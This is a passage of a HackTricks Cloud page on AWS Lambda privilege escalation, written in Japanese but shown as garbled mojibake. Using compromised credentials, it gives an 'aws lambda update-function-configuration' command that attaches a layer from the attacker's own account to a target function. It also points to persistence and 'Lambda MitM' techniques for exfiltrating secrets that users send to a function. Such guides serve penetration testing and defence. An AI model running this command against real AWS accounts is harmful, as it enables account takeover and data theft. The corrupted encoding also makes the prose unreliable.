ç¾åœ¨ã€ç§ãŸã¡ãŒæŒã£ã¦ã„ã‚‹**ä¾µå®³ã•ã‚ŒãŸè³‡æ ¼æƒ…å ±**ã‚’ä½¿ç”¨ã—ã¦ã€ã‚¿ãƒ¼ã‚²ãƒƒãƒˆã®Lambdaé–¢æ•°ã€Œs3-getterã€ã§ä»¥ä¸‹ã®ã‚³ãƒãƒ³ãƒ‰ã‚’å®Ÿè¡Œã—ã¾ã™ã€‚ã“ã‚Œã«ã‚ˆã‚Šã€**ã‚¯ãƒ­ã‚¹ã‚¢ã‚«ã‚¦ãƒ³ãƒˆã®Lambdaãƒ¬ã‚¤ãƒ¤ãƒ¼ãŒã‚¢ã‚¿ãƒƒãƒ**ã•ã‚Œã¾ã™ã€‚
```
aws lambda update-function-configuration \
--function-name s3-getter \
--layers arn:aws:lambda:REGION:OUR-ACCOUNT-ID:layer:boto3:1
```
æ¬¡ã®ã‚¹ãƒ†ãƒƒãƒ—ã¯ã€**é–¢æ•°ã‚’è‡ªåˆ†ã§å‘¼ã³å‡ºã™**ã‹ã€é€šå¸¸ã®æ‰‹æ®µã§**å‘¼ã³å‡ºã•ã‚Œã‚‹ã®ã‚’å¾…ã¤**ã“ã¨ã§ã™-ã“ã‚ŒãŒå®‰å…¨ãªæ–¹æ³•ã§ã™ã€‚

ã“ã®è„†å¼±æ€§ã‚’æ‚ªç”¨ã™ã‚‹**ã‚ˆã‚Šã‚¹ãƒ†ãƒ«ã‚¹ãªæ–¹æ³•**ã¯ã€æ¬¡ã®å ´æ‰€ã«ã‚ã‚Šã¾ã™ï¼š

{% content-ref url="../aws-persistence/aws-lambda-persistence/aws-lambda-layers-persistence.md" %}
[aws-lambda-layers-persistence.md](../aws-persistence/aws-lambda-persistence/aws-lambda-layers-persistence.md)
{% endcontent-ref %}

**æ½œåœ¨çš„ãªå½±éŸ¿ï¼š**ä½¿ç”¨ã•ã‚Œã¦ã„ã‚‹Lambdaã‚µãƒ¼ãƒ“ã‚¹ãƒ­ãƒ¼ãƒ«ã¸ã®ç›´æ¥ã®ç‰¹æ¨©æ˜‡æ ¼ã€‚

### `?iam:PassRole`, `lambda:CreateFunction`, `lambda:CreateFunctionUrlConfig`, `lambda:InvokeFunctionUrl`

ã“ã‚Œã‚‰ã®æ¨©é™ã‚’æŒã£ã¦ã„ã‚‹å ´åˆã€é–¢æ•°ã‚’ä½œæˆã—ã€URLã‚’å‘¼ã³å‡ºã—ã¦å®Ÿè¡Œã™ã‚‹ã“ã¨ãŒã§ãã‚‹ã‹ã‚‚ã—ã‚Œã¾ã›ã‚“...ã—ã‹ã—ã€ç§ã¯ãã‚Œã‚’ãƒ†ã‚¹ãƒˆã™ã‚‹æ–¹æ³•ã‚’è¦‹ã¤ã‘ã‚‹ã“ã¨ãŒã§ãã¾ã›ã‚“ã§ã—ãŸã®ã§ã€ã§ãã‚‹ã‹ã©ã†ã‹æ•™ãˆã¦ãã ã•ã„ï¼

### Lambda MitM

ä¸€éƒ¨ã®Lambdaã¯ã€**ãƒ¦ãƒ¼ã‚¶ãƒ¼ã‹ã‚‰ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ãƒ¼ã§æ©Ÿå¯†æƒ…å ±ã‚’å—ã‘å–ã‚‹**ã“ã¨ã«ãªã‚Šã¾ã™ã€‚ã‚‚ã—ã€ãã®ã†ã¡ã®1ã¤ã§RCEã‚’å–å¾—ã—ãŸå ´åˆã€ä»–ã®ãƒ¦ãƒ¼ã‚¶ãƒ¼ãŒãã‚Œã«é€ä¿¡ã—ã¦ã„ã‚‹æƒ…å ±ã‚’å¤–éƒ¨ã«æµå‡ºã•ã›ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚è©³ç´°ã¯æ¬¡ã®å ´æ‰€ã§ç¢ºèªã—ã¦ãã ã•ã„ï¼š

{% content-ref url="../aws-post-exploitation/aws-lambda-post-exploitation/aws-warm-lambda-persistence.md" %}
[aws-warm-lambda-persistence.md](../aws-post-exploitation/aws-lambda-post-exploitation/aws-warm-lambda-persistence.md)
{% endcontent-ref %}

<details>

<summary><strong>Support HackTricks and get benefits!</strong></summary>

* ã‚‚ã—ã€**HackTricksã§ä¼šç¤¾ã‚’å®£ä¼ã—ãŸã„**å ´åˆã‚„ã€**PEASSã®æœ€æ–°ãƒãƒ¼ã‚¸ãƒ§ãƒ³ã«ã‚¢ã‚¯ã‚»ã‚¹ã—ãŸã„**å ´åˆã¯ã€[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼
* [**å…¬å¼ã®PEASSï¼†HackTricksã‚°ãƒƒã‚º**](https://peass.creator-spring.com)ã‚’æ‰‹ã«å…¥ã‚Œã¾ã—ã‚‡ã†ã€‚
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ã‚’è¦‹ã¤ã‘ã¦ã€ç‹¬å çš„ãª[**NFT**](https://opensea.io/collection/the-peass-family)ã‚’æ‰‹ã«å…¥ã‚Œã¾ã—ã‚‡ã†ã€‚
* **ğŸ’¬ [Discordã‚°ãƒ«ãƒ¼ãƒ—](https://discord.gg/hRep4RUj7f)**ã¾ãŸã¯[**telegramã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«å‚åŠ ã™ã‚‹ã‹ã€**Twitter**ã§ç§ã‚’ãƒ•ã‚©ãƒ­ãƒ¼ã—ã¦ãã ã•ã„ğŸ¦ [**@carlospolopm**](https://twitter.com/carlospolopm)**ã€‚**
* **ãƒãƒƒã‚­ãƒ³ã‚°ã®ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã™ã‚‹ãŸã‚ã«ã€**[**HackTricks**](https://github.com/carlospolop/hacktricks)ã¨[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)ã®GitHubãƒªãƒã‚¸ãƒˆãƒªã«PRã‚’æå‡ºã—ã¦ãã ã•ã„ã€‚

</details>
